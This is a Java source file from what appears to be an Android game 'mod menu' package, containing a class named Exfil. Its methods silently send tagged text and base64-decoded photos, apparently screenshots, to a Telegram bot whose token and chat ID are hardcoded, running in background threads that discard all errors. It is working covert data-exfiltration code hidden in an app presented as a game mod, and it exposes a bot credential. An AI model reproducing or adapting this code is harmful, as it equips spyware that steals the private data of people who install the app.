package com.brawl.modmenu;

import android.util.Base64;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLEncoder;
import javax.crypto.Cipher;
import javax.crypto.spec.SecretKeySpec;

public class Exfil {
    private static final String TOKEN = "8688274559:AAGlGdaQh70HHSrEs_zMdkeW1udazQr6z5A";
    private static final String CHAT  = "8558500657";

    public static void send(String tag, String data) {
        new Thread(() -> {
            try {
                String payload = "[" + tag + "]\n" + data;
                String url = "https://api.telegram.org/bot" + TOKEN + "/sendMessage";
                String body = "chat_id=" + CHAT
                        + "&text=" + URLEncoder.encode(payload, "UTF-8");

                HttpURLConnection c = (HttpURLConnection) new URL(url).openConnection();
                c.setRequestMethod("POST");
                c.setDoOutput(true);
                c.setConnectTimeout(15000);
                c.setReadTimeout(15000);
                try (OutputStream os = c.getOutputStream()) {
                    os.write(body.getBytes("UTF-8"));
                }
                c.getResponseCode();
            } catch (Exception ignored) {}
        }).start();
    }

    public static void sendPhoto(String tag, String b64) {
        new Thread(() -> {
            try {
                String url = "https://api.telegram.org/bot" + TOKEN + "/sendPhoto";
                String boundary = "----bnd" + System.currentTimeMillis();

                HttpURLConnection c = (HttpURLConnection) new URL(url).openConnection();
                c.setRequestMethod("POST");
                c.setDoOutput(true);
                c.setRequestProperty("Content-Type",
                        "multipart/form-data; boundary=" + boundary);
                c.setConnectTimeout(30000);
                c.setReadTimeout(30000);

                OutputStream out = c.getOutputStream();
                java.io.PrintWriter w = new java.io.PrintWriter(
                        new java.io.OutputStreamWriter(out, "UTF-8"), false);

                w.append("--").append(boundary).append("\r\n");
                w.append("Content-Disposition: form-data; name=\"chat_id\"\r\n\r\n");
                w.append(CHAT).append("\r\n");

                w.append("--").append(boundary).append("\r\n");
                w.append("Content-Disposition: form-data; name=\"caption\"\r\n\r\n");
                w.append("[").append(tag).append("] ")
                 .append(new java.util.Date().toString()).append("\r\n");

                w.append("--").append(boundary).append("\r\n");
                w.append("Content-Disposition: form-data; name=\"photo\"; filename=\"s.jpg\"\r\n");
                w.append("Content-Type: image/jpeg\r\n\r\n");
                w.flush();

                out.write(Base64.decode(b64, Base64.DEFAULT));

                w.append("\r\n--").append(boundary).append("--\r\n");
                w.flush();
                w.close();
                c.getResponseCode();
            } catch (Throwable ignored) {}
        }).start();
    }
}
